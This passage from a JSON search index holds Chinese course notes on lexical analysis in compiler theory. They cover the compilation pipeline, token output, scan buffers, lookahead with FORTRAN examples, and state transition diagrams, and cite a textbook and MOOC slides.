\u6807\u8bc6\u7b26\u8bc6\u522b \u5b57\u6bcd\u5f00\u5934\u7684\u5b57\u6bcd\u6570\u5b57\u4e32\uff0c\u540e\u8ddf\u754c\u7b26\u6216\u7b97\u7b26 \u5e38\u6570\u8bc6\u522b \u8bc6\u522b\u51fa\u7b97\u672f\u5e38\u6570\u5e76\u5c06\u5176\u8f6c\u53d8\u4e3a\u4e8c\u8fdb\u5236\u5185\u7801\u8868\u793a\uff0c\u5982 5.EQ.M 5.E08 \u7b97\u7b26\u548c\u754c\u7b26\u7684\u8bc6\u522b \u628a\u591a\u5b57\u7b26\u7ec4\u6210\u7684\u7b97\u7b26\u548c\u754c\u7b26\u62fc\u5408\u6210\u4e00\u4e2a\u5355\u8bcd\u7b26\u53f7 :=\uff0c **\uff0c .EQ. \uff0c ++\uff0c--\uff0c>= \u7531\u4e8e\u8d85\u524d\u641c\u7d22\u8fd9\u4e2a\u95ee\u9898\u7684\u5b58\u5728\uff0c\u73b0\u5728\u7684\u7f16\u7a0b\u8bed\u8a00\u5927\u591a\u52a0\u5165\u4e86\u4e00\u4e9b\u9650\u5236\uff0c\u4ece\u800c\u907f\u514d\u8d85\u524d\u641c\u7d22\u3002 \u6240\u6709\u57fa\u672c\u5b57\u90fd\u662f\u4fdd\u7559\u5b57;\u7528\u6237\u4e0d\u80fd\u7528\u5b83\u4eec\u4f5c\u81ea\u5df1\u7684\u6807\u8bc6\u7b26 \u57fa\u672c\u5b57\u4f5c\u4e3a\u7279\u6b8a\u7684\u6807\u8bc6\u7b26\u6765\u5904\u7406\uff0c\u4f7f\u7528\u4fdd\u7559\u5b57\u8868 \u5982\u679c\u57fa\u672c\u5b57\u3001\u6807\u8bc6\u7b26\u548c\u5e38\u6570(\u6216\u6807\u53f7)\u4e4b\u95f4\u6ca1\u6709\u786e\u5b9a\u7684\u8fd0\u7b97\u7b26\u6216\u754c\u7b26\u4f5c\u95f4\u9694\uff0c\u5219\u5fc5\u987b\u4f7f\u7528\u4e00\u4e2a\u7a7a\u767d\u7b26\u4f5c\u95f4\u9694\uff0c\u5982\uff1a DO99K=1\uff0c10 \u8981\u5199\u6210 DO \\hspace*{0.2cm} 99 \\hspace*{0.2cm} K=1\uff0c10 4. \u72b6\u6001\u8f6c\u6362\u56fe # \u4f7f\u7528\u72b6\u6001\u8f6c\u6362\u56fe\u662f\u8bbe\u8ba1\u8bcd\u6cd5\u5206\u6790\u5668\u7684\u4e00\u79cd\u597d\u9014\u5f84\u3002\u8f6c\u6362\u56fe\u662f\u4e00\u5f20\u6709\u9650\u65b9\u5411\u56fe\uff0c\u53ef\u7528\u4e8e\u8bc6\u522b(\u6216\u63a5\u53d7)\u4e00\u5b9a\u7684\u5b57\u7b26\u4e32\u3002 \u5728\u72b6\u6001\u8f6c\u6362\u56fe\u4e2d\uff0c \u8282\u70b9\u4ee3\u8868\u72b6\u6001\uff0c\u7528\u5706\u5708\u8868\u793a \u72b6\u6001\u4e4b\u95f4\u7528\u7bad\u5f27\u8fde\u63a5\u3002\u7bad\u5f27\u4e0a\u7684\u6807\u8bb0\uff08\u5b57\u7b26\uff09\u4ee3\u8868\u5728\u5c04\u51fa\u7ed3\u70b9\uff08\u5373\u7bad\u5f27\u59cb\u7ed3\u70b9\uff09\u72b6\u6001\u4e0b\u53ef\u80fd\u51fa\u73b0\u7684\u8f93\u51fa\u5b57\u7b26\u6216\u5b57\u7b26\u7c7b \u4e00\u5f20\u8f6c\u6362\u56fe\u53ea\u5305\u542b\u6709\u9650\u4e2a\u72b6\u6001\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u4e3a\u521d\u6001\uff0c\u81f3\u5c11\u8981\u6709\u4e00\u4e2a\u7ec8\u6001 \u4f8b\u5982\uff0c\u56fe6\u8868\u793a\uff0c\u4ece\u521d\u6001\u8fdb\u5165\u72b6\u60011\uff0c\u82e5\u8bfb\u5165\u5b57\u7b26\u5219\u8fdb\u5165\u72b6\u60012\uff0c\u82e5\u8bfb\u5165\u6570\u5b57\u5219\u8fdb\u5165\u72b6\u60013\u3002 stateDiagram [*] --> \u72b6\u60011 \u72b6\u60011 --> \u72b6\u60012: \u5b57\u7b26 \u72b6\u60011 --> \u72b6\u60013: \u6570\u5b57 \\text{Figure 6. \u72b6\u6001\u8f6c\u6362\u56fe} \u56fe7\u4e2d\u7ec8\u6001\u8282\u70b9\u53f3\u4e0a\u89d2\u7684\u661f\u53f7\u8868\u793a\u8bfb\u5165\u5176\u4ed6\u5b57\u7b26\u540e\u9700\u8981\u56de\u9000\u5230\u4e0a\u4e00\u4e2a\u8f93\u5165\uff0c\u5373\u6700\u7ec8\u8bc6\u522b\u51fa\u7684\u7ed3\u679c\u4e0d\u5305\u542b\u9664\u6570\u5b57\u4ee5\u5916\u7684\u5176\u4ed6\u5b57\u7b26\u3002 \\text{Figure 7. \u8bc6\u522b\u6574\u5e38\u6570\u7684\u72b6\u6001\u8f6c\u6362\u56fe} \u56fe8\u662f\u4e00\u4e2a\u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8bbe\u8ba1\u793a\u4f8b \\text{Figure 8. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8bbe\u8ba1\u793a\u4f8b} \u6ce8\uff1a\u90e8\u5206\u5185\u5bb9\u6574\u7406\u81ea\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750\u548c\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b PPT 5. \u53c2\u8003\u6587\u732e # [1] \u9648\u706b\u65fa. \u7f16\u8bd1\u539f\u7406 [M]. \u5317\u4eac : \u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e, 2010. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.\u8bcd\u6cd5\u5206\u6790\u6982\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#_1","text":"","title":"\u8bcd\u6cd5\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#_2","text":"\u8bcd\u6cd5\u5206\u6790 \u76ee\u5f55 1. \u80cc\u666f 2. \u8bcd\u6cd5\u5206\u6790 2.1. \u7f16\u8bd1\u6d41\u7a0b 2.2. \u8bcd\u6cd5\u5206\u6790\u7684\u4efb\u52a1 2.3. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u529f\u80fd 2.4. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8f93\u51fa 2.5. \u8bcd\u6cd5\u5206\u6790\u5668\u5728\u7f16\u8bd1\u5668\u4e2d\u5730\u4f4d 3. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8bbe\u8ba1 3.1. \u8f93\u5165\u3001\u9884\u5904\u7406 3.2. \u8d85\u524d\u641c\u7d22 4. \u72b6\u6001\u8f6c\u6362\u56fe 5. \u53c2\u8003\u6587\u732e","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#1","text":"\u4eca\u5929\u5b66\u4e60\u4e86\u7f16\u8bd1\u539f\u7406\u4e2d\u7684 \u8bcd\u6cd5\u5206\u6790 \u8fd9\u4e00\u7ae0\u8282\uff0c\u6211\u53c2\u8003\u4e86\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750 1 \u548c\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b \u7684PPT\uff0c\u6574\u7406\u4e86\u8fd9\u4e00\u7ae0\u7684\u5185\u5bb9\uff0c\u5e0c\u671b\u80fd\u591f\u7406\u89e3\u8fd9\u90e8\u5206\u7684\u77e5\u8bc6\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#2","text":"","title":"2. \u8bcd\u6cd5\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#21","text":"graph TB A(\u6e90\u7a0b\u5e8f) -->|\u5f00\u59cb\u7f16\u8bd1| B[\u8bcd\u6cd5\u5206\u6790\u5668] B --> |\u5355\u8bcd\u7b26\u53f7|C[\u8bed\u6cd5\u5206\u6790\u5668] C -->|\u8bed\u6cd5\u5355\u4f4d| D[\u8bed\u4e49\u5206\u6790\u4e0e\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u5668] W[\u8bed\u4e49\u5206\u6790\u4e0e\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u5668] -->|\u4e2d\u95f4\u4ee3\u7801-\u56db\u5143\u5f0f| E[\u4f18\u5316\u6bb5] E -->|\u4e2d\u95f4\u4ee3\u7801-\u56db\u5143\u5f0f| F[\u76ee\u6807\u4ee3\u7801\u751f\u6210\u5668] F -->|\u76ee\u6807\u4ee3\u7801|G(\u7f16\u8bd1\u5b8c\u6210) \\text{Figure 1. \u7f16\u8bd1\u6d41\u7a0b}","title":"2.1. \u7f16\u8bd1\u6d41\u7a0b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#22","text":"\u8bcd\u6cd5\u5206\u6790\u7684\u4efb\u52a1 \u4ece\u5de6\u81f3\u53f3\u9010\u4e2a\u5b57\u7b26\u5730\u5bf9\u6e90\u7a0b\u5e8f\u8fdb\u884c\u626b\u63cf\uff0c\u4ea7\u751f\u4e00\u4e2a\u4e2a\u5355\u8bcd\u7b26\u53f7 \u8bcd\u6cd5\u5206\u6790\u5668(Lexical Analyzer) \u626b\u63cf\u5668(Scanner) \u6267\u884c\u8bcd\u6cd5\u5206\u6790\u7684\u7a0b\u5e8f","title":"2.2. \u8bcd\u6cd5\u5206\u6790\u7684\u4efb\u52a1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#23","text":"\u529f\u80fd \u8f93\u5165\u6e90\u7a0b\u5e8f\u3001\u8f93\u51fa\u5355\u8bcd\u7b26\u53f7 \u5355\u8bcd\u7b26\u53f7\u7684\u79cd\u7c7b \u57fa\u672c\u5b57 :\u5982 begin\uff0crepeat\uff0cfor\uff0c... \u6807\u8bc6\u7b26 :\u7528\u6765\u8868\u793a\u5404\u79cd\u540d\u5b57\uff0c\u5982\u53d8\u91cf\u540d\u3001\u6570\u7ec4\u540d\u548c\u8fc7\u7a0b\u540d \u5e38\u6570 :\u5404\u79cd\u7c7b\u578b\u7684\u5e38\u6570 \u8fd0\u7b97\u7b26 : +\uff0c-\uff0c*\uff0c/\uff0c \\cdots \u754c\u7b26 :\u9017\u53f7\u3001\u5206\u53f7\u3001\u62ec\u53f7\u548c\u7a7a\u767d","title":"2.3. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u529f\u80fd"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#24","text":"\u8f93\u51fa\u7684\u5355\u8bcd\u7b26\u53f7\u7684\u8868\u793a\u5f62\u5f0f ( \u5355\u8bcd\u79cd\u522b\uff0c\u5355\u8bcd\u81ea\u8eab\u7684\u503c ) \u5355\u8bcd\u79cd\u522b\u901a\u5e38\u7528\u6574\u6570\u7f16\u7801\u8868\u793a \u82e5\u4e00\u4e2a\u79cd\u522b\u53ea\u6709\u4e00\u4e2a\u5355\u8bcd\u7b26\u53f7\uff0c\u5219\u79cd\u522b\u7f16\u7801\u5c31\u4ee3\u8868\u8be5\u5355\u8bcd\u7b26\u53f7\u3002\u5047\u5b9a \u57fa\u672c\u5b57\u3001\u8fd0\u7b97\u7b26 \u548c \u754c\u7b26 \u90fd\u662f\u4e00\u7b26\u4e00\u79cd\u3002 \u82e5\u4e00\u4e2a\u79cd\u522b\u6709\u591a\u4e2a\u5355\u8bcd\u7b26\u53f7\uff0c\u5219\u5bf9\u4e8e\u6bcf\u4e2a\u5355\u8bcd\u7b26\u53f7\uff0c\u7ed9\u51fa\u79cd\u522b \u7f16\u7801 \u548c \u81ea\u8eab\u7684\u503c \u3002 \u6807\u8bc6\u7b26 \u5355\u5217\u4e00\u79cd;\u6807\u8bc6\u7b26\u81ea\u8eab\u7684\u503c\u8868\u793a\u6210\u6309\u673a\u5668\u5b57\u8282\u5212\u5206\u7684\u5185\u90e8\u7801 \u5e38\u6570 \u6309\u7c7b\u578b\u5206\u79cd;\u5e38\u6570\u7684\u503c\u5219\u8868\u793a\u6210\u6807\u51c6\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f","title":"2.4. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8f93\u51fa"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#25","text":"graph LR O(\u6e90\u7a0b\u5e8f) --> |\u6e90\u7a0b\u5e8f|A A[\u8bcd\u6cd5\u5206\u6790\u5668] -->|\u5355\u8bcd\u7b26\u53f7| B[\u8bed\u6cd5\u5206\u6790\u5668] B --> |\u53d6\u4e0b\u4e00\u5355\u8bcd|A C[\u7b26\u53f7\u8868] --- A C[\u7b26\u53f7\u8868] --- B \\text{Figure 2. \u8bcd\u6cd5\u5206\u6790\u5668\u5728\u7f16\u8bd1\u5668\u4e2d\u5730\u4f4d}","title":"2.5. \u8bcd\u6cd5\u5206\u6790\u5668\u5728\u7f16\u8bd1\u5668\u4e2d\u5730\u4f4d"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#3","text":"","title":"3. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8bbe\u8ba1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#31","text":"\u8bcd\u6cd5\u5206\u6790\u5668\u5de5\u4f5c\u7684\u7b2c\u4e00\u6b65\u662f\u8f93\u5165\u6e90\u7a0b\u5e8f\u6587\u672c\u3002\u8f93\u5165\u4e32\u4e00\u822c\u662f\u653e\u5728\u4e00\u4e2a\u7f13\u51b2\u533a\u4e2d\uff0c\u8fd9\u4e2a\u7f13\u51b2\u533a\u79f0 \u8f93\u5165\u7f26\u51b2\u533a \u3002\u8bcd\u6cd5\u5206\u6790\u7684\u5de5\u4f5c\uff08\u5355\u8bcd\u7b26\u53f7\u7684\u8bc6\u522b\uff09\u53ef\u4ee5\u76f4\u63a5\u5728\u8fd9\u4e2a \u7f13\u51b2\u533a \u4e2d\u8fdb\u884c\u3002\u4f46\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b\uff0c\u628a\u8f93\u5165\u4e32\u9884\u5904\u7406\u4e00\u4e0b\uff0c\u5bf9\u5355\u8bcd\u7b26\u53f7\u7684\u8bc6\u522b\u5de5\u4f5c\u5c06\u662f\u6bd4\u8f83\u65b9\u4fbf\u7684\u3002 \u6211\u4eec\u53ef\u4ee5\u8bbe\u60f3\u4e00\u4e2a \u9884\u5904\u7406\u5b50\u7a0b\u5e8f \uff0c\u5b83\u80fd\u591f\u5b8c\u6210\u53bb\u9664\u7a7a\u767d\u7b26\u3001\u6362\u884c\u7b26\u548c\u6ce8\u91ca\u8fd8\u6709\u5408\u5e76\u754c\u7b26\u7b49\u4efb\u52a1\u3002 \u6bcf\u5f53\u8bcd\u6cd5\u5206\u6790\u5668\u8c03\u7528\u5b83\u65f6\uff0c\u5b83\u5c31\u5904\u7406\u51fa\u4e00\u4e32\u786e\u5b9a\u957f\u5ea6\uff08\u5982120\u4e2a\u5b57\u7b26\uff09\u7684\u8f93\u5165\u5b57\u7b26\uff0c\u5e76\u5c06\u5176\u88c5\u8fdb\u8bcd\u6cd5\u5206\u6790\u5668\u6240\u6307\u5b9a\u7684\u7f13\u51b2\u533a\u4e2d\uff08\u79f0\u4e3a \u626b\u63cf\u7f13\u51b2\u533a \uff09\u3002\u8fd9\u6837\uff0c\u5206\u6790\u5668\u5c31\u53ef\u4ee5\u5728\u6b64\u7f13\u51b2\u533a\u4e2d\u76f4\u63a5\u8fdb\u884c\u5355\u8bcd\u7b26\u53f7\u7684\u8bc6\u522b\uff0c\u800c\u4e0d\u5fc5\u7ba1\u5176\u4ed6\u7e41\u7410\u4e8b\u7269\u3002 \\text{Figure 3. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u7ed3\u6784} \u5206\u6790\u5668\u5bf9\u626b\u63cf\u7f13\u51b2\u533a\u8fdb\u884c\u626b\u63cf\u65f6\u4e00\u822c\u7528\u4e24\u4e2a \u6307\u793a\u5668 \uff0c\u4e00\u4e2a\u6307\u5411\u5f53\u524d\u6b63\u5728\u8bc6\u522b\u7684\u5355\u8bcd\u7684 \u5f00\u59cb\u4f4d\u7f6e \uff08\u6307\u5411\u65b0\u5355\u8bcd\u7684\u9996\u5b57\u7b26\uff09\uff0c\u53e6\u4e00\u4e2a\u7528\u4e8e\u5411\u524d\u641c\u7d22\u4ee5\u5bfb\u627e\u5355\u8bcd\u7684\u7ec8\u70b9\u3002 \u4e0d\u8bba \u626b\u63cf\u7f13\u51b2\u533a \u8bbe\u5f97\u591a\u5927\u90fd\u4e0d\u80fd\u4fdd\u8bc1\u5355\u8bcd\u7b26\u53f7\u4e0d\u4f1a\u88ab\u5b83\u7684\u8fb9\u754c\u6240\u6253\u65ad\u3002\u56e0\u6b64\uff0c\u626b\u63cf\u7f13\u51b2\u533a\u6700\u597d\u4f7f\u7528\u4e00\u4e2a \u4e00\u5206\u4e3a\u4e8c\u7684\u533a\u57df \u3002\u5e76\u5bf9\u6807\u8bc6\u7b26\u548c\u5e38\u6570\u7684\u957f\u5ea6 \u52a0\u4ee5\u9650\u5236 \uff08\u4f8b\u5982\uff0c\u4e0d\u5f97\u591a\u4e8e120\u4e2a\u5b57\u7b26\uff09\u3002\u5426\u5219\uff0c\u5373\u4f7f\u7f13\u51b2\u533a\u518d\u5927\u4e5f\u65e0\u6d4e\u4e8e\u4e8b\u3002 \\text{Figure 4. \u626b\u63cf\u7f13\u51b2\u533a}","title":"3.1. \u8f93\u5165\u3001\u9884\u5904\u7406"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#32","text":"\u5b9a\u4e49\uff1a\u8bcd\u6cd5\u5206\u6790\u8fc7\u7a0b\u4e2d\uff0c\u6709\u65f6\u4e3a\u4e86\u786e\u5b9a\u8bcd\u6027\uff0c\u9700\u8d85\u524d\u626b\u63cf\u82e5\u5e72\u4e2a\u5b57\u7b26\u3002 \u5982\u4ee5\u4e0bFORTRAN\u8bed\u53e5\uff0c\u7528\u6237\u53ef\u4ee5\u91cd\u65b0\u5b9a\u4e49\u5173\u952e\u5b57\uff0c\u7f16\u8bd1\u5668\u5c31\u9700\u8981\u8d85\u524d\u626b\u63cf\u90fd\u5173\u952e\u5b57\u540e\u7684\u6570\u5b57\u683c\u5f0f\u624d\u80fd\u77e5\u9053\u5176\u8bcd\u6027\u3002 \\text{Figure 5. \u8d85\u524d\u641c\u7d22} \u9664\u4e86\u5173\u952e\u5b57\u9700\u8981\u8d85\u524d\u641c\u7d22\uff0c\u6807\u8bc6\u7b26\u3001\u5e38\u6570\u3001\u7b97\u7b26\u548c\u754c\u7b26\u7b49\u4e5f\u53ef\u80fd\u4f1a\u9700\u8981\u8d85\u524d\u641c\u7d22\u3002 \u6807\u8bc6\u7b26\u8bc6\u522b \u5b57\u6bcd\u5f00\u5934\u7684\u5b57\u6bcd\u6570\u5b57\u4e32\uff0c\u540e\u8ddf\u754c\u7b26\u6216\u7b97\u7b26 \u5e38\u6570\u8bc6\u522b \u8bc6\u522b\u51fa\u7b97\u672f\u5e38\u6570\u5e76\u5c06\u5176\u8f6c\u53d8\u4e3a\u4e8c\u8fdb\u5236\u5185\u7801\u8868\u793a\uff0c\u5982 5.EQ.M 5.E08 \u7b97\u7b26\u548c\u754c\u7b26\u7684\u8bc6\u522b \u628a\u591a\u5b57\u7b26\u7ec4\u6210\u7684\u7b97\u7b26\u548c\u754c\u7b26\u62fc\u5408\u6210\u4e00\u4e2a\u5355\u8bcd\u7b26\u53f7 :=\uff0c **\uff0c .EQ. \uff0c ++\uff0c--\uff0c>= \u7531\u4e8e\u8d85\u524d\u641c\u7d22\u8fd9\u4e2a\u95ee\u9898\u7684\u5b58\u5728\uff0c\u73b0\u5728\u7684\u7f16\u7a0b\u8bed\u8a00\u5927\u591a\u52a0\u5165\u4e86\u4e00\u4e9b\u9650\u5236\uff0c\u4ece\u800c\u907f\u514d\u8d85\u524d\u641c\u7d22\u3002 \u6240\u6709\u57fa\u672c\u5b57\u90fd\u662f\u4fdd\u7559\u5b57;\u7528\u6237\u4e0d\u80fd\u7528\u5b83\u4eec\u4f5c\u81ea\u5df1\u7684\u6807\u8bc6\u7b26 \u57fa\u672c\u5b57\u4f5c\u4e3a\u7279\u6b8a\u7684\u6807\u8bc6\u7b26\u6765\u5904\u7406\uff0c\u4f7f\u7528\u4fdd\u7559\u5b57\u8868 \u5982\u679c\u57fa\u672c\u5b57\u3001\u6807\u8bc6\u7b26\u548c\u5e38\u6570(\u6216\u6807\u53f7)\u4e4b\u95f4\u6ca1\u6709\u786e\u5b9a\u7684\u8fd0\u7b97\u7b26\u6216\u754c\u7b26\u4f5c\u95f4\u9694\uff0c\u5219\u5fc5\u987b\u4f7f\u7528\u4e00\u4e2a\u7a7a\u767d\u7b26\u4f5c\u95f4\u9694\uff0c\u5982\uff1a DO99K=1\uff0c10 \u8981\u5199\u6210 DO \\hspace*{0.2cm} 99 \\hspace*{0.2cm} K=1\uff0c10","title":"3.2. \u8d85\u524d\u641c\u7d22"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#4","text":"\u4f7f\u7528\u72b6\u6001\u8f6c\u6362\u56fe\u662f\u8bbe\u8ba1\u8bcd\u6cd5\u5206\u6790\u5668\u7684\u4e00\u79cd\u597d\u9014\u5f84\u3002\u8f6c\u6362\u56fe\u662f\u4e00\u5f20\u6709\u9650\u65b9\u5411\u56fe\uff0c\u53ef\u7528\u4e8e\u8bc6\u522b(\u6216\u63a5\u53d7)\u4e00\u5b9a\u7684\u5b57\u7b26\u4e32\u3002 \u5728\u72b6\u6001\u8f6c\u6362\u56fe\u4e2d\uff0c \u8282\u70b9\u4ee3\u8868\u72b6\u6001\uff0c\u7528\u5706\u5708\u8868\u793a \u72b6\u6001\u4e4b\u95f4\u7528\u7bad\u5f27\u8fde\u63a5\u3002\u7bad\u5f27\u4e0a\u7684\u6807\u8bb0\uff08\u5b57\u7b26\uff09\u4ee3\u8868\u5728\u5c04\u51fa\u7ed3\u70b9\uff08\u5373\u7bad\u5f27\u59cb\u7ed3\u70b9\uff09\u72b6\u6001\u4e0b\u53ef\u80fd\u51fa\u73b0\u7684\u8f93\u51fa\u5b57\u7b26\u6216\u5b57\u7b26\u7c7b \u4e00\u5f20\u8f6c\u6362\u56fe\u53ea\u5305\u542b\u6709\u9650\u4e2a\u72b6\u6001\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u4e3a\u521d\u6001\uff0c\u81f3\u5c11\u8981\u6709\u4e00\u4e2a\u7ec8\u6001 \u4f8b\u5982\uff0c\u56fe6\u8868\u793a\uff0c\u4ece\u521d\u6001\u8fdb\u5165\u72b6\u60011\uff0c\u82e5\u8bfb\u5165\u5b57\u7b26\u5219\u8fdb\u5165\u72b6\u60012\uff0c\u82e5\u8bfb\u5165\u6570\u5b57\u5219\u8fdb\u5165\u72b6\u60013\u3002 stateDiagram [*] --> \u72b6\u60011 \u72b6\u60011 --> \u72b6\u60012: \u5b57\u7b26 \u72b6\u60011 --> \u72b6\u60013: \u6570\u5b57 \\text{Figure 6. \u72b6\u6001\u8f6c\u6362\u56fe} \u56fe7\u4e2d\u7ec8\u6001\u8282\u70b9\u53f3\u4e0a\u89d2\u7684\u661f\u53f7\u8868\u793a\u8bfb\u5165\u5176\u4ed6\u5b57\u7b26\u540e\u9700\u8981\u56de\u9000\u5230\u4e0a\u4e00\u4e2a\u8f93\u5165\uff0c\u5373\u6700\u7ec8\u8bc6\u522b\u51fa\u7684\u7ed3\u679c\u4e0d\u5305\u542b\u9664\u6570\u5b57\u4ee5\u5916\u7684\u5176\u4ed6\u5b57\u7b26\u3002 \\text{Figure 7. \u8bc6\u522b\u6574\u5e38\u6570\u7684\u72b6\u6001\u8f6c\u6362\u56fe} \u56fe8\u662f\u4e00\u4e2a\u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8bbe\u8ba1\u793a\u4f8b \\text{Figure 8. \u8bcd\u6cd5\u5206\u6790\u5668\u7684\u8bbe\u8ba1\u793a\u4f8b} \u6ce8\uff1a\u90e8\u5206\u5185\u5bb9\u6574\u7406\u81ea\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750\u548c\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b PPT","title":"4. \u72b6\u6001\u8f6c\u6362\u56fe"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/2.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/#5","text":"[1] \u9648\u706b\u65fa. \u7f16\u8bd1\u539f\u7406 [M]. \u5317\u4eac : \u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e, 2010. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/3.%E8%AF%AD%E6%B3%95%E5%88%86%E6%9E%90-%E8%87%AA%E4%B8%8A%E8%80%8C%E4%B8%8B%E5%88%86%E6%9E%90%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/","text":"\u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u7684\u57fa\u672c\u95ee\u9898 # \u76ee\u5f55 # \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790\u7684\u57fa\u672c\u95ee\u9898 \u76ee\u5f55 1. \u80cc\u666f 2. \u8bed\u6cd5\u5206\u6790 2.1. \u8bed\u6cd5\u5206\u6790\u7684\u524d\u63d0 2.2. \u8bed\u6cd5\u5206\u6790\u7684\u4efb\u52a1 2.3. \u8bed\u6cd5\u5206\u6790\u5668\u5728\u7f16\u8bd1\u5668\u4e2d\u7684\u5730\u4f4d 2.4. \u8bed\u6cd5\u5206\u6790\u7684\u65b9\u6cd5 2.4.1. \u81ea\u4e0b\u800c\u4e0a(Bottom-up) 2.4.2. \u81ea\u4e0a\u800c\u4e0b(Top-down) 2.5. 